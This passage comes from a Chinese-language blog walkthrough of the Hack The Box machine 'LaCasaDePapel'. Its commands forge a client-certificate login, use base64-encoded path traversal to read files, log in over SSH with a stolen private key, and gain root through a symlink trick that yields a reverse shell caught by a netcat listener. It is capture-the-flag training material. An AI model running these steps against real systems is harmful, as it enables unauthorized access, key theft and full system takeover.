class="built_in">export</span> -clcerts -<span class="keyword">in</span> owef_cert.pem -inkey owef_key.pem -out owef.p12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建owef.p12后, 通过curl访问</span></span><br><span class="line">$ curl --insecure --cert owef.p12 --cert-type p12 https://lacasadepapel.htb</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<p>访问https之后, 找到LFI漏洞，利用LFI漏洞读取berlin目录下的ssh私钥<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl --insecure --cert owef.p12 --cert-type p12 https://lacasadepapel.htb/\?path\=SEASON-1</span><br><span class="line">$ python -c <span class="string">"print 'U0VBU09OLTEvMDIuYXZp'.decode('base64')"</span> =&gt; SEASON-1/02.avi</span><br><span class="line">$ python -c <span class="string">"print '../user.txt'.encode('base64')"</span> =&gt; Li4vdXNlci50eHQ=</span><br><span class="line">$ curl --insecure --cert owef.p12 --cert-type p12 https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=  =&gt; 4dcbd172fc9c9ef2ff65c13448d9062d</span><br><span class="line"><span class="comment"># user.txt = 4dcbd172fc9c9ef2ff65c13448d9062d</span></span><br></pre></td></tr></table></figure></p>
+<p>利用berlin用户的id_rsa作为ssh私钥文件登陆professor用户<code>ssh -i id_rsa professor@10.10.10.131</code>进入professor用户下，接下来尝试获取root权限。</p>
+<blockquote>
+<p>Symblink</p>
+</blockquote>
+<p>每次遇到提权都不得不提一位大牛说的话”it’s easy if you know”</p>
+<p>进入ssh后，先后尝试LinEnum.sh收集信息、pspy64查看ssh用户登陆、退出时执行的命令及计划任务执行的命令，始终无法找到突破口，最后无意中发现可以在professor的home目录中创建memcached.js的软连接；然后又创建memcached.ini文件的软连接，获取root reverse shell<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lv 4444</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (3558): Not a tty</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-4.4<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line">bash-4.4<span class="comment">#  echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/root.txt 2&gt;/dev/null; echo " "</span></span><br><span class="line"> <span class="string">"proof:"</span>;cat /root/root.txt 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">" "</span>sbin/ifconfig -a;<span class="built_in">echo</span> <span class="string">" "</span>;<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">uname -a:</span><br><span class="line">Linux lacasadepapel 4.14.78-0-virt <span class="comment">#1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64 Linux</span></span><br><span class="line"></span><br><span class="line">hostname:</span><br><span class="line">lacasadepapel</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line"></span><br><span class="line">ifconfig:</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:50:56:BD:40:9D</span><br><span class="line">          inet addr:10.10.10.131  Bcast:0.0.0.0  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: dead:beef::250:56ff:febd:409d/64 Scope:Global</span><br><span class="line">          inet6 addr: fe80::250:56ff:febd:409d/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:9550 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9368 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:972699 (949.9 KiB)  TX bytes:1548975 (1.4 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:358 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:358 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:223180 (217.9 KiB)  TX bytes:223180 (217.9 KiB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof:</span><br><span class="line">586979c48efbef5909a23750cc07f511</span><br><span class="line"></span><br><span class="line">bash-4.4<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+            <a href="/tags/LFI/" rel="tag"># LFI</a>
+          
+            <a href="/tags/ssl/" rel="tag"># ssl</a>
+          
+            <a href="/tags/psysh/" rel="tag"># psysh</a>
+          
+            <a href="/tags/php-function/" rel="tag"># php_function</a>
+          
+            <a href="/tags/symblink/" rel="tag"># symblink</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/02/PasswordAttacks/" rel="next" title="PasswordAttacks">
+                <i class="fa fa-chevron-left"></i> PasswordAttacks
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/05/Python-Deserialize-Analyze/" rel="prev" title="Python Deserialize Analyze">
+                Python Deserialize Analyze <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章目录"><span class="nav-number">1.</span> <span class="nav-text">文章目录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">1.0.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ftp-backdoor"><span class="nav-number">1.0.2.</span> <span class="nav-text">ftp backdoor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#read-ca-key"><span class="nav-number">1.0.3.</span> <span class="nav-text">read ca.key</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
